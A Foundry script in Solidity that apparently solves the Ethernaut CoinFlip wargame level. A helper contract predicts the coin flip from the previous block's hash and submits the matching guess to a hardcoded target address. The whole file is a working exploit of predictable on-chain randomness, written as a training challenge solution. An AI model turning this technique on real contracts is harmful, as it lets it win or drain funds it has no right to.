// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "ethernaut/coin_flip.sol";
import "forge-std/console.sol";

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        CoinFlip targetIns = CoinFlip(_target);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        targetIns.flip(side);
        console.log("consecutiveWins: ", targetIns.consecutiveWins());
    }
}

contract CoinFlipHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(0xB523529BFa2e03f646a883245559A0370e10066c);

        vm.stopBroadcast();
    }
}
